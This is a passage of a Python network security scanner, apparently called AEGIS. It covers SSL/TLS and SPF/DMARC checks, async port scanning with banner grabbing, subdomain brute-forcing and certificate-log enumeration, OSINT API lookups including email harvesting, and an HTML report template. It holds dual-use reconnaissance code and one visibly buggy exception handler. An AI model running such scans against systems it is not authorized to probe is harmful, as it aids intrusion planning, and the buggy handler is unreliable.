                                    name=str(name),
                                    value=str(rd),
                                ))
                except Exception:
                    import logging as _l; _l.getLogger("aegis.node").debug("silent exception at L1775: %s", _silent_e)
        except Exception as _exc:
            log.debug("unknown: %s", _exc)
        return records

    def _fallback_dns(self) -> List[DNSRecord]:
        records: List[DNSRecord] = []
        try:
            ip = socket.gethostbyname(self.domain)
            records.append(DNSRecord("A", self.domain, ip))
        except Exception as _exc:
            log.debug("_fallback_dns: %s", _exc)
        return records

    def analyze_spf_dmarc(self, records: List[DNSRecord]) -> List[str]:
        issues: List[str] = []
        spf_found   = False
        dmarc_found = False
        for r in records:
            if r.record_type == "TXT":
                if "v=spf1" in r.value:
                    spf_found = True
                    if "+all" in r.value:
                        issues.append("SPF record uses +all — anyone can send email as this domain")
                    elif "~all" in r.value:
                        issues.append("SPF uses ~all (softfail) — consider -all for strict enforcement")
                if "_dmarc" in r.name or "v=DMARC1" in r.value:
                    dmarc_found = True
                    if "p=none" in r.value:
                        issues.append("DMARC policy is p=none — no enforcement action taken")
        if not spf_found:
            issues.append("No SPF record found — email spoofing is possible")
        if not dmarc_found:
            issues.append("No DMARC record found — no email authentication policy")
        return issues


# ════════════════════════════════════════════════════════
# SSL / TLS ANALYZER
# ════════════════════════════════════════════════════════

class SSLAnalyzer:
    """
    Analyze SSL/TLS certificate, supported protocol versions,
    cipher suites, expiry, self-signed check, HSTS.
    """

    def __init__(self, config: ScanConfig):
        self.config = config

    async def analyze(self, host: str, port: int = 443) -> Optional[SSLResult]:
        loop = asyncio.get_event_loop()
        return await loop.run_in_executor(None, self._analyze_sync, host, port)

    def _analyze_sync(self, host: str, port: int) -> Optional[SSLResult]:
        result = SSLResult(host=host, port=port)
        # Get cert info
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            with socket.create_connection((host, port), timeout=10) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    result.cipher_suite = ssock.cipher()[0] if ssock.cipher() else ""
                    result.tls_version  = ssock.version() or ""
                    result.supports_tls12 = "TLSv1.2" in result.tls_version
                    result.supports_tls13 = "TLSv1.3" in result.tls_version
                    if cert:
                        result = self._parse_cert(result, cert)
        except Exception as e:
            result.vulnerabilities.append(f"SSL connection failed: {e}")
            return result

        # OpenSSL deep inspection
        if OpenSSL_crypt:
            try:
                raw = ssl.get_server_certificate((host, port),
                                                  ssl_version=ssl.PROTOCOL_TLS_CLIENT if hasattr(ssl,"PROTOCOL_TLS_CLIENT") else ssl.PROTOCOL_TLS)
                x509 = OpenSSL_crypt.load_certificate(OpenSSL_crypt.FILETYPE_PEM, raw)
                result.key_type  = x509.get_pubkey().type().name if hasattr(x509.get_pubkey().type(), "name") else str(x509.get_pubkey().type())
                result.key_bits  = x509.get_pubkey().bits()
                result.signature_algo = x509.get_signature_algorithm().decode("utf-8", errors="replace")
                result.is_self_signed = (
                    x509.get_subject().CN == x509.get_issuer().CN
                    and x509.get_subject().O  == x509.get_issuer().O
                )
            except Exception as _exc:
                log.debug("unknown: %s", _exc)

        # Check TLS 1.0/1.1
        for ver, attr in [("TLSv1", "supports_tls10"), ("TLSv1.1", "supports_tls11")]:
            try:
                ctx2 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
                ctx2.check_hostname = False
                ctx2.verify_mode    = ssl.CERT_NONE
                ctx2.maximum_version = getattr(ssl, "TLSVersion", None) and \
                    getattr(ssl.TLSVersion, ver.replace(".","_"), None) or None
                if ctx2.maximum_version:
                    with socket.create_connection((host, port), timeout=5) as s2:
                        with ctx2.wrap_socket(s2, server_hostname=host) as ss2:
                            setattr(result, attr, True)
                            result.vulnerabilities.append(f"{ver} supported — deprecated protocol")
            except Exception as _exc:
                log.debug("unknown: %s", _exc)

        # Vuln analysis
        if result.is_expired:
            result.vulnerabilities.append("Certificate is EXPIRED")
        if result.days_remaining < 30:
            result.vulnerabilities.append(f"Certificate expires in {result.days_remaining} days")
        if result.is_self_signed:
            result.vulnerabilities.append("Self-signed certificate")
        if result.key_bits and result.key_bits < 2048:
            result.vulnerabilities.append(f"Weak key size: {result.key_bits} bits")
        if result.supports_tls10:
            result.vulnerabilities.append("TLS 1.0 supported (deprecated)")
        if result.supports_tls11:
            result.vulnerabilities.append("TLS 1.1 supported (deprecated)")
        if "RC4" in result.cipher_suite or "DES" in result.cipher_suite:
            result.vulnerabilities.append(f"Weak cipher: {result.cipher_suite}")

        return result

    def _parse_cert(self, result: SSLResult, cert: dict) -> SSLResult:
        subj = dict(x[0] for x in cert.get("subject", []))
        issuer = dict(x[0] for x in cert.get("issuer", []))
        result.subject = subj
        result.issuer  = issuer

        # SANs
        for typ, val in cert.get("subjectAltName", []):
            if typ == "DNS":
                result.san.append(val)

        # Dates
        nb_str = cert.get("notBefore", "")
        na_str = cert.get("notAfter", "")
        try:
            fmt = "%b %d %H:%M:%S %Y %Z"
            nb  = datetime.strptime(nb_str, fmt).replace(tzinfo=timezone.utc)
            na  = datetime.strptime(na_str, fmt).replace(tzinfo=timezone.utc)
            result.not_before    = nb_str
            result.not_after     = na_str
            now = datetime.now(timezone.utc)
            result.days_remaining = max(0, (na - now).days)
            result.is_expired     = now > na
        except Exception as _exc:
            log.debug("unknown: %s", _exc)

        return result


# ════════════════════════════════════════════════════════
# PORT SCANNER
# ════════════════════════════════════════════════════════

class PortScanner:
    """Async TCP port scanner with banner grabbing."""

    BANNER_PROBES = {
        21:  b"",             # FTP sends banner on connect
        22:  b"",             # SSH sends banner on connect
        25:  b"EHLO localhost\r\n",
        80:  b"HEAD / HTTP/1.0\r\n\r\n",
        443: b"HEAD / HTTP/1.0\r\n\r\n",
        3306: b"\x00",
        6379: b"*1\r\n$4\r\nPING\r\n",
        9200: b"GET / HTTP/1.0\r\n\r\n",
        27017: b"\x3a\x00\x00\x00\xd4\x07\x00\x00\x00\x00\x00\x00\xd4\x07\x00\x00\x00\x00\x00\x00admin.$cmd\x00\x00\x00\x00\x00\xff\xff\xff\xff\x13\x00\x00\x00\x10serverStatus\x00\x01\x00\x00\x00\x00",
    }

    def __init__(self, config: ScanConfig):
        self.config = config

    async def scan(self, host: str,
                   ports: Optional[List[int]] = None) -> List[PortResult]:
        ports   = ports or COMMON_PORTS
        results : List[PortResult] = []
        sem     = asyncio.Semaphore(min(self.config.threads, 50))

        async def check(port: int):
            async with sem:
                state, banner = await self._probe(host, port)
            if state == "open":
                service = PORT_SERVICES.get(port, "unknown")
                results.append(PortResult(
                    port=port, state=state,
                    service=service, banner=banner,
                ))

        await asyncio.gather(*[check(p) for p in ports], return_exceptions=True)
        results.sort(key=lambda r: r.port)
        return results

    async def _probe(self, host: str, port: int) -> Tuple[str, str]:
        probe  = self.BANNER_PROBES.get(port, b"")
        banner = ""
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=3.0
            )
            if probe:
                writer.write(probe)
                await writer.drain()
            try:
                data = await asyncio.wait_for(reader.read(1024), timeout=2.0)
                banner = data.decode("utf-8", errors="replace").strip()[:200]
            except Exception as _exc:
                log.debug("_probe: %s", _exc)
            writer.close()
            with suppress(Exception):
                await writer.wait_closed()
            return "open", banner
        except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
            return "closed", ""
        except Exception:
            return "filtered", ""


# ════════════════════════════════════════════════════════
# SUBDOMAIN ENUMERATOR
# ════════════════════════════════════════════════════════

class SubdomainEnum:
    """
    Subdomain discovery via:
    1. DNS brute-force wordlist
    2. Certificate Transparency logs (crt.sh)
    3. Passive DNS sources
    """

    def __init__(self, config: ScanConfig, http: HTTPClient):
        self.config = config
        self.http   = http
        self.domain = extract_base_domain(config.target)
        self._found: Dict[str, SubdomainResult] = {}

    async def run(self) -> List[SubdomainResult]:
        await asyncio.gather(
            self._bruteforce(),
            self._crtsh(),
            self._hackertarget(),
            return_exceptions=True,
        )
        # Alive check
        await self._check_alive()
        return list(self._found.values())

    async def _bruteforce(self):
        words = SUBDOMAIN_WORDLIST
        if self.config.wordlist and self.config.wordlist.exists():
            words = self.config.wordlist.read_text().splitlines()

        sem   = asyncio.Semaphore(min(self.config.threads, 30))
        async def resolve(word: str):
            subdomain = f"{word}.{self.domain}"
            async with sem:
                loop = asyncio.get_event_loop()
                try:
                    ips = await loop.run_in_executor(
                        None, socket.gethostbyname_ex, subdomain
                    )
                    self._add(subdomain, ips[2], [], "brute")
                except Exception as _exc:
                    log.debug("resolve: %s", _exc)

        await asyncio.gather(*[resolve(w) for w in words], return_exceptions=True)

    async def _crtsh(self):
        url  = f"https://crt.sh/?q=%.{self.domain}&output=json"
        resp = await self.http.get(url)
        if not resp or resp.get("status") != 200:
            return
        try:
            data = json.loads(resp.get("text","[]"))
            for entry in data:
                names = entry.get("name_value", "").split("\n")
                for n in names:
                    n = n.strip().lstrip("*.")
                    if n.endswith(f".{self.domain}") or n == self.domain:
                        self._add(n, [], [], "crt.sh")
        except Exception as _exc:
            log.debug("_crtsh: %s", _exc)

    async def _hackertarget(self):
        url  = f"https://api.hackertarget.com/hostsearch/?q={self.domain}"
        resp = await self.http.get(url)
        if not resp or resp.get("status") != 200:
            return
        for line in resp.get("text","").splitlines():
            parts = line.split(",")
            if len(parts) >= 2:
                self._add(parts[0].strip(), [parts[1].strip()], [], "hackertarget")

    async def _check_alive(self):
        sem = asyncio.Semaphore(20)
        async def check(sub: SubdomainResult):
            async with sem:
                for scheme in ("https", "http"):
                    url  = f"{scheme}://{sub.subdomain}"
                    resp = await self.http.get(url)
                    if resp:
                        sub.status_code = resp.get("status", 0)
                        sub.alive       = True
                        return
        await asyncio.gather(*[check(s) for s in self._found.values()], return_exceptions=True)

    def _add(self, subdomain: str, ips: List[str], cnames: List[str], source: str):
        if subdomain not in self._found:
            self._found[subdomain] = SubdomainResult(
                subdomain=subdomain, ip_addresses=list(set(ips)),
                cnames=cnames, source=source
            )
        else:
            self._found[subdomain].ip_addresses = list(
                set(self._found[subdomain].ip_addresses + ips)
            )

# ════════════════════════════════════════════════════════
# OSINT MODULE — Pure aiohttp REST, zero third-party deps
# ════════════════════════════════════════════════════════

class OSINTModule:
    """
    OSINT lookups via direct REST APIs (no library dependencies):
    Shodan, Censys, VirusTotal, GreyNoise, Hunter.io, SecurityTrails.
    Whois via python-whois or socket fallback.
    """

    def __init__(self, config: ScanConfig, http: HTTPClient):
        self.config = config
        self.http   = http
        # Keys
        self.shodan_key           = config.shodan_key or ""
        self.vt_key               = config.vt_key or ""
        self.censys_id            = config.censys_id or ""
        self.censys_secret        = config.censys_secret or ""
        self.greynoise_key        = config.greynoise_key or ""
        self.hunter_key           = config.hunter_key or ""
        self.securitytrails_key   = config.securitytrails_key or ""

    async def run(self, target: str) -> Dict[str, Any]:
        results: Dict[str, Any] = {}
        tasks: List[asyncio.Task] = []

        parsed = urlparse(target)
        host   = parsed.hostname or target
        is_ip_addr = is_ip(host)

        # Resolve IP
        ip = host if is_ip_addr else get_ip(host)
        results["resolved_ip"] = ip

        # Whois
        tasks.append(self._whois(host))

        # API-based OSINT
        if self.shodan_key:
            tasks.append(self._shodan(ip or host))
        if self.censys_id and self.censys_secret:
            tasks.append(self._censys(ip or host))
        if self.vt_key:
            tasks.append(self._virustotal(host))
        if self.greynoise_key and ip:
            tasks.append(self._greynoise(ip))
        if self.hunter_key and not is_ip_addr:
            tasks.append(self._hunter(extract_base_domain(target)))
        if self.securitytrails_key and not is_ip_addr:
            tasks.append(self._securitytrails(extract_base_domain(target)))

        gathered = await asyncio.gather(*tasks, return_exceptions=True)
        for item in gathered:
            if isinstance(item, dict):
                results.update(item)

        return results

    # ── Whois ──────────────────────────────────────────
    async def _whois(self, host: str) -> Dict[str, Any]:
        loop = asyncio.get_event_loop()
        def _do():
            if whois_lib:
                try:
                    w = whois_lib.whois(host)
                    return {"whois": {k: str(v) for k, v in w.items() if v}}
                except Exception as _exc:
                    log.debug("_do: %s", _exc)
            return {"whois": {}}
        return await loop.run_in_executor(None, _do)

    # ── Shodan ─────────────────────────────────────────
    async def _shodan(self, target_str: str) -> Dict[str, Any]:
        if is_ip(target_str):
            url = f"https://api.shodan.io/shodan/host/{target_str}?key={self.shodan_key}"
        else:
            url = (f"https://api.shodan.io/shodan/host/search"
                   f"?key={self.shodan_key}&query=hostname:{target_str}")
        resp = await self.http.get(url)
        if resp and resp.get("status") == 200:
            try:
                return {"shodan": json.loads(resp.get("text", "{}"))}
            except Exception as _exc:
                log.debug("_shodan: %s", _exc)
        return {"shodan": {}}

    # ── Censys ─────────────────────────────────────────
    async def _censys(self, target_str: str) -> Dict[str, Any]:
        creds = base64.b64encode(
            f"{self.censys_id}:{self.censys_secret}".encode()
        ).decode()
        headers = {"Authorization": f"Basic {creds}",
                   "Content-Type": "application/json"}
        if is_ip(target_str):
            url  = f"https://search.censys.io/api/v2/hosts/{target_str}"
            resp = await self.http.get(url, headers=headers)
        else:
            url  = "https://search.censys.io/api/v2/hosts/search"
            resp = await self.http.post(
                url, headers=headers,
                json_data={"q": f"parsed.names: {target_str}", "per_page": 25}
            )
        if resp and resp.get("status") in (200, 201):
            try:
                return {"censys": json.loads(resp.get("text", "{}"))}
            except Exception as _exc:
                log.debug("_censys: %s", _exc)
        return {"censys": {}}

    # ── VirusTotal ─────────────────────────────────────
    async def _virustotal(self, host: str) -> Dict[str, Any]:
        headers = {"x-apikey": self.vt_key}
        endpoint = (
            f"https://www.virustotal.com/api/v3/ip_addresses/{host}"
            if is_ip(host)
            else f"https://www.virustotal.com/api/v3/domains/{host}"
        )
        resp = await self.http.get(endpoint, headers=headers)
        if resp and resp.get("status") == 200:
            try:
                data = json.loads(resp.get("text", "{}"))
                attrs = data.get("data", {}).get("attributes", {})
                stats = attrs.get("last_analysis_stats", {})
                return {
                    "virustotal": {
                        "malicious":   stats.get("malicious", 0),
                        "suspicious":  stats.get("suspicious", 0),
                        "harmless":    stats.get("harmless", 0),
                        "reputation":  attrs.get("reputation", 0),
                        "categories":  attrs.get("categories", {}),
                        "country":     attrs.get("country", ""),
                    }
                }
            except Exception as _exc:
                log.debug("unknown: %s", _exc)
        return {"virustotal": {}}

    # ── GreyNoise ──────────────────────────────────────
    async def _greynoise(self, ip: str) -> Dict[str, Any]:
        for endpoint in [
            f"https://api.greynoise.io/v2/noise/quick/{ip}",
            f"https://api.greynoise.io/v3/community/{ip}",
        ]:
            resp = await self.http.get(endpoint, headers={"key": self.greynoise_key})
            if resp and resp.get("status") == 200:
                try:
                    return {"greynoise": json.loads(resp.get("text", "{}"))}
                except Exception as _exc:
                    log.debug("_greynoise: %s", _exc)
        return {"greynoise": {}}

    # ── Hunter.io ──────────────────────────────────────
    async def _hunter(self, domain: str) -> Dict[str, Any]:
        url  = (f"https://api.hunter.io/v2/domain-search"
                f"?domain={domain}&api_key={self.hunter_key}&limit=50")
        resp = await self.http.get(url)
        if resp and resp.get("status") == 200:
            try:
                data = json.loads(resp.get("text", "{}"))
                emails = [
                    e.get("value") for e in
                    data.get("data", {}).get("emails", [])
                ]
                return {
                    "hunter": {
                        "emails":       emails,
                        "total":        data.get("data", {}).get("total", 0),
                        "organization": data.get("data", {}).get("organization", ""),
                    }
                }
            except Exception as _exc:
                log.debug("_hunter: %s", _exc)
        return {"hunter": {}}

    # ── SecurityTrails ─────────────────────────────────
    async def _securitytrails(self, domain: str) -> Dict[str, Any]:
        headers = {"APIKEY": self.securitytrails_key,
                   "Accept": "application/json"}
        results: Dict[str, Any] = {}
        for path, key in [
            (f"/v1/domain/{domain}", "domain_info"),
            (f"/v1/domain/{domain}/subdomains", "subdomains"),
        ]:
            resp = await self.http.get(
                f"https://api.securitytrails.com{path}", headers=headers
            )
            if resp and resp.get("status") == 200:
                try:
                    results[key] = json.loads(resp.get("text", "{}"))
                except Exception as _exc:
                    log.debug("_securitytrails: %s", _exc)
        return {"securitytrails": results}


# ════════════════════════════════════════════════════════
# ML RISK SCORER
# ════════════════════════════════════════════════════════

class MLScorer:
    """
    ML-based risk scoring using scikit-learn SGDClassifier.
    Features: vuln severity counts, finding categories, response anomalies.
    Falls back to heuristic if sklearn unavailable.
    """

    def __init__(self):
        self.model    = None
        self.scaler   = None
        self._trained = False
        self._init_model()

    def _init_model(self):
        if not (_skl_sgd and _skl_scl and numpy):
            return
        try:
            self.model  = _skl_sgd(
                loss="log_loss", max_iter=1000, random_state=42
            )
            self.scaler = _skl_scl()
        except Exception as _exc:
            log.debug("_init_model: %s", _exc)

    def score_results(self, results: "ScanResults") -> Dict[str, float]:
        scores: Dict[str, float] = {}
        features = self._extract_features(results)
        if not features:
            return scores

        # If sklearn available, use heuristic-trained model
        if self.model and not self._trained:
            try:
                self._quick_train()
            except Exception as _exc:
                log.debug("score_results: %s", _exc)

        # Heuristic scoring (works with or without sklearn)
        vuln_score     = self._vuln_score(results.vulns)
        finding_score  = self._finding_score(results.findings)
        port_score     = self._port_score(results.ports)
        ssl_score      = self._ssl_score(results.ssl)
        dns_score      = 0.1 if results.dns else 0.0
        overall        = min(10.0, (vuln_score + finding_score + port_score + ssl_score) / 4)

        scores = {
            "overall":      round(overall, 2),
            "vulnerabilities": round(vuln_score, 2),
            "data_exposure":   round(finding_score, 2),
            "network":         round(port_score, 2),
            "ssl_tls":         round(ssl_score, 2),
            "risk_level":      self._risk_label(overall),
        }
        return scores

    def _extract_features(self, results: "ScanResults") -> List[float]:
        try:
            vuln_types  = Counter(v.vuln_type for v in results.vulns)
            sev_counts  = Counter(v.severity for v in results.vulns)
            find_cats   = Counter(f.category for f in results.findings)
            return [
                sev_counts.get("critical", 0),
                sev_counts.get("high",     0),
                sev_counts.get("medium",   0),
                sev_counts.get("low",      0),
                len(results.vulns),
                len(results.findings),
                len(results.ports),
                find_cats.get("aws_access_key", 0),
                find_cats.get("generic_secret", 0),
                find_cats.get("jwt_token", 0),
                1 if (results.ssl and results.ssl.is_expired) else 0,
                1 if (results.ssl and results.ssl.supports_tls10) else 0,
                len(results.subdomains),
            ]
        except Exception:
            return []

    def _quick_train(self):
        """Seed with synthetic samples for initial training."""
        import numpy as np
        X_train = np.array([
            [0,0,0,0,0,0,0,0,0,0,0,0,0],   # benign
            [0,0,1,2,3,5,2,0,0,0,0,0,3],   # low risk
            [0,1,2,3,6,10,5,0,1,0,0,0,5],  # medium risk
            [1,2,3,4,10,20,10,1,2,1,0,1,10],# high risk
            [3,5,5,5,20,50,20,2,5,3,1,1,20],# critical
        ], dtype=float)
        y_train = [0, 2, 5, 7, 10]
        X_scaled = self.scaler.fit_transform(X_train)
        self.model.fit(X_scaled, y_train)
        self._trained = True

    @staticmethod
    def _vuln_score(vulns: List[VulnResult]) -> float:
        weights = {"critical": 3.5, "high": 2.5, "medium": 1.5, "low": 0.5, "info": 0.1}
        score   = sum(weights.get(v.severity, 0) for v in vulns)
        return min(10.0, score * 0.8)

    @staticmethod
    def _finding_score(findings: List[Finding]) -> float:
        weights = {"critical": 4.0, "high": 2.5, "medium": 1.5, "low": 0.5, "info": 0.1}
        score   = sum(weights.get(f.severity, 0) for f in findings)
        return min(10.0, score * 0.6)

    @staticmethod
    def _port_score(ports: List[PortResult]) -> float:
        risky = {21,23,135,139,445,1433,3389,5900,6379,27017,11211,2375}
        score = sum(2.0 if p.port in risky else 0.3 for p in ports if p.state == "open")
        return min(10.0, score)

    @staticmethod
    def _ssl_score(ssl_result: Optional[SSLResult]) -> float:
        if not ssl_result:
            return 5.0  # unknown — moderate risk
        score = len(ssl_result.vulnerabilities) * 1.5
        return min(10.0, score)

    @staticmethod
    def _risk_label(score: float) -> str:
        if score >= 8:  return "CRITICAL"
        if score >= 6:  return "HIGH"
        if score >= 4:  return "MEDIUM"
        if score >= 2:  return "LOW"
        return "INFO"


# ════════════════════════════════════════════════════════
# PLUGIN MANAGER
# ════════════════════════════════════════════════════════

class PluginManager:
    """Load and run Python plugins from a directory."""

    def __init__(self, plugins_dir: Optional[Path]):
        self.plugins_dir = plugins_dir
        self.plugins: List[Any] = []

    def load(self):
        if not self.plugins_dir or not self.plugins_dir.is_dir():
            return
        for path in self.plugins_dir.glob("*.py"):
            try:
                spec = importlib.util.spec_from_file_location(path.stem, path)
                if spec and spec.loader:
                    mod = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(mod)
                    for name, obj in mod.__dict__.items():
                        if (
                            isinstance(obj, type)
                            and hasattr(obj, "run")
                            and not name.startswith("_")
                        ):
                            self.plugins.append(obj())
                            cprint(f"[dim]Plugin loaded: {name} from {path.name}[/dim]")
            except Exception as e:
                cprint(f"[yellow]Plugin load failed {path.name}: {e}[/yellow]")

    async def run_all(self, results: "ScanResults", config: ScanConfig) -> List[Dict]:
        out: List[Dict] = []
        for plugin in self.plugins:
            try:
                r = plugin.run(results, config)
                if asyncio.iscoroutine(r):
                    r = await r
                if isinstance(r, dict):
                    out.append(r)
            except Exception as e:
                cprint(f"[yellow]Plugin {type(plugin).__name__} error: {e}[/yellow]")
        return out


# ════════════════════════════════════════════════════════
# REPORT GENERATOR
# ════════════════════════════════════════════════════════

# ─── HTML TEMPLATE ────────────────────────────────────
# Placeholders use @@PLACEHOLDER@@ format to avoid
# conflicts with CSS/JS curly braces.
_HTML_TEMPLATE = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>AEGIS Report &#8212; @@TARGET@@</title>
<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect fill='%23040406' width='32' height='32'/%3E%3Ctext y='24' font-size='20' fill='%2300d2ff'%3E%E2%AC%A1%3C/text%3E%3C/svg%3E">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=DM+Mono:wght@300;400;500&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.2/dist/chart.umd.min.js"></script>
<script src="https://unpkg.com/vis-network@9.1.9/standalone/umd/vis-network.min.js"></script>
<style>
:root{
  --void:#040406;--deep:#08080e;--surface:#0e0e16;--raised:#131320;
  --overlay:#191928;--card:#1b1b2c;
  --b0:rgba(0,210,255,.04);--b1:rgba(0,210,255,.09);--b2:rgba(0,210,255,.2);--b3:rgba(0,210,255,.5);
  --cyan:#00d2ff;--cglow:rgba(0,210,255,.10);--cdim:rgba(0,210,255,.55);
  --green:#00ff88;--gglow:rgba(0,255,136,.09);
  --red:#ff3366;--rglow:rgba(255,51,102,.09);
  --amber:#ffaa00;--aglow:rgba(255,170,0,.09);
  --purple:#b060ff;--pglow:rgba(176,96,255,.09);
  --orange:#ff6633;
  --t0:#eef1f8;--t1:#c6cad9;--t2:#6e7488;--t3:#3c4056;--t4:#21243a;
  --font-ui:'Rajdhani',sans-serif;
  --font-mono:'Share Tech Mono',monospace;
  --font-data:'DM Mono',monospace;
  --r:3px;--r2:6px;--r3:10px;
  --sh:0 8px 40px rgba(0,0,0,.65);
  --sh2:0 2px 16px rgba(0,0,0,.4);
}
*{box-sizing:border-box;margin:0;padding:0}
html{scroll-behavior:smooth}
body{font-family:var(--font-ui);background:var(--void);color:var(--t1);min-height:100vh;overflow-x:hidden}
body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
  background-image:linear-gradient(rgba(0,210,255,.018) 1px,transparent 1px),linear-gradient(90deg,rgba(0,210,255,.018) 1px,transparent 1px);
  background-size:52px 52px}
body::after{content:'';position:fixed;inset:0;z-index:1;pointer-events:none;opacity:.4;
  background:repeating-linear-gradient(to bottom,transparent 0,transparent 2px,rgba(0,0,0,.07) 2px,rgba(0,0,0,.07) 3px)}
.wrap{position:relative;z-index:2;max-width:1400px;margin:0 auto;padding:2rem 1.75rem 5rem}

/* ── PRINT ─────────────────────────────────────────── */
@media print{
  body,*{background:#fff!important;color:#111!important;-webkit-print-color-adjust:exact}
  body::before,body::after,.no-print,.hdr-actions,.tabs,#toast,.modal-bg{display:none!important}
  .wrap{max-width:100%;padding:.5rem}
  .tab{display:block!important;page-break-inside:avoid}
  .panel,.scard,.chart-box{border:1px solid #ddd!important;background:#fafafa!important;break-inside:avoid}
  table.dt td,table.dt th{border:1px solid #ddd!important;color:#111!important}
  .badge{border:1px solid #aaa!important}
  .tbl-wrap{max-height:none!important;overflow:visible!important}
  .logo{-webkit-text-fill-color:#111!important;color:#111!important}
}

/* ── HEADER ─────────────────────────────────────────── */
.hdr{position:relative;text-align:center;padding:3.5rem 2rem 2.5rem;margin-bottom:2.5rem;
  border-bottom:1px solid var(--b1)}
.hdr::after{content:'';position:absolute;bottom:-1px;left:50%;transform:translateX(-50%);
  width:300px;height:1px;background:linear-gradient(90deg,transparent,var(--cyan),transparent)}
.logo{font-family:var(--font-mono);font-size:5.2rem;letter-spacing:.5em;display:inline-block;
  background:linear-gradient(135deg,#00d2ff 0%,#005cff 50%,#8844ee 100%);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;
  animation:glitch 14s infinite}
@keyframes glitch{
  0%,89%,100%{transform:translate(0,0);filter:none}
  90%{transform:translate(-3px,1px);filter:hue-rotate(30deg)}
  91%{transform:translate(3px,-2px);filter:hue-rotate(-30deg)}
  92%{transform:translate(0,0)}93%{transform:translate(2px,2px);filter:hue-rotate(15deg)}
  94%{transform:translate(0,0);filter:none}
}
.logo-sub{font-family:var(--font-mono);font-size:.72rem;letter-spacing:.32em;color:var(--t3);
  text-transform:uppercase;margin-top:.5rem}
.meta-bar{margin-top:1.5rem;display:inline-flex;align-items:center;gap:1.1rem;flex-wrap:wrap;
  justify-content:center;background:var(--surface);border:1px solid var(--b1);
  padding:.6rem 1.6rem;border-radius:var(--r);font-family:var(--font-data);font-size:.72rem;color:var(--t2)}
.tbadge{font-family:var(--font-mono);color:var(--cyan);background:rgba(0,210,255,.07);
  padding:.15rem .75rem;border:1px solid var(--b2);border-radius:2px;letter-spacing:.06em}
.sep{color:var(--t4)}
.risk-pill{padding:.24rem .9rem;border-radius:2px;font-family:var(--font-mono);
  font-size:.66rem;letter-spacing:.15em;font-weight:700}
.risk-CRITICAL{background:rgba(255,51,102,.2);color:#ff3366;border:1px solid rgba(255,51,102,.4)}
.risk-HIGH{background:rgba(255,102,51,.18);color:#ff6633;border:1px solid rgba(255,102,51,.35)}
.risk-MEDIUM{background:rgba(255,170,0,.18);color:#ffaa00;border:1px solid rgba(255,170,0,.35)}
.risk-LOW{background:rgba(0,255,136,.12);color:#00ff88;border:1px solid rgba(0,255,136,.28)}
.risk-INFO{background:rgba(0,210,255,.09);color:var(--cyan);border:1px solid var(--b2)}
.hdr-actions{margin-top:1.25rem;display:flex;gap:.6rem;justify-content:center;flex-wrap:wrap}
.hdr-btn{font-family:var(--font-mono);font-size:.58rem;letter-spacing:.13em;text-transform:uppercase;
  padding:.38rem .9rem;background:transparent;border:1px solid var(--b1);color:var(--t2);
  border-radius:var(--r);cursor:pointer;transition:all .18s;text-decoration:none;display:inline-flex;align-items:center;gap:.4rem}
.hdr-btn:hover{border-color:var(--cyan);color:var(--cyan);background:var(--cglow)}
.hdr-btn.primary{border-color:var(--b2);color:var(--cyan);background:var(--cglow)}
.hdr-btn.primary:hover{background:rgba(0,210,255,.17)}
.hdr-btn.danger:hover{border-color:var(--red);color:var(--red);background:var(--rglow)}

/* ── ML SCORE STRIP ──────────────────────────────────── */
.ml-strip{display:grid;grid-template-columns:1.2fr repeat(4,1fr);gap:1px;
  background:var(--b1);border:1px solid var(--b1);border-radius:var(--r2);
  overflow:hidden;margin-bottom:2.25rem}
.ml-cell{background:var(--surface);padding:1.1rem 1.4rem;display:flex;flex-direction:column;gap:.5rem}
.ml-cell.main{background:var(--raised)}
.ml-label{font-family:var(--font-mono);font-size:.52rem;letter-spacing:.2em;text-transform:uppercase;color:var(--t3)}
.ml-val{font-family:var(--font-mono);font-size:2rem;line-height:1;color:var(--cyan)}
.ml-cell.main .ml-val{font-size:3.2rem}
.ml-risk{font-family:var(--font-mono);font-size:.6rem;letter-spacing:.1em;color:var(--t3)}
.ml-bar{height:3px;background:rgba(255,255,255,.06);border-radius:2px;overflow:hidden;margin-top:.1rem}
.ml-fill{height:100%;border-radius:2px;background:linear-gradient(90deg,var(--cyan),var(--purple));
  transition:width 1.1s .3s ease;width:0}
@media(max-width:720px){.ml-strip{grid-template-columns:1fr 1fr}}

/* ── STAT CARDS ────────────────────────────────────── */
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:.9rem;margin-bottom:2.25rem}
@media(max-width:950px){.stats{grid-template-columns:repeat(2,1fr)}}
@media(max-width:500px){.stats{grid-template-columns:1fr}}
.scard{background:var(--card);border:1px solid var(--b1);border-radius:var(--r2);
  padding:1.2rem 1.4rem;position:relative;overflow:hidden;cursor:default;transition:all .2s}
.scard:hover{border-color:var(--ac,var(--cyan));transform:translateY(-3px);box-shadow:var(--sh)}
.scard::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;
  background:var(--ac,var(--cyan));opacity:.85}
.scard::after{content:'';position:absolute;top:0;left:0;width:100%;height:100%;
  background:radial-gradient(ellipse at top left,var(--ag,rgba(0,210,255,.06)) 0%,transparent 65%);pointer-events:none}
.slbl{font-family:var(--font-mono);font-size:.52rem;letter-spacing:.21em;text-transform:uppercase;color:var(--t3);margin-bottom:.6rem}
.sval{font-family:var(--font-mono);font-size:2.7rem;line-height:1;color:var(--ac,var(--cyan));
  transition:all .1s}
.ssub{font-family:var(--font-data);font-size:.62rem;color:var(--t3);margin-top:.28rem;line-height:1.4}
.sico{position:absolute;right:1.1rem;top:50%;transform:translateY(-50%);font-size:1.7rem;opacity:.13}

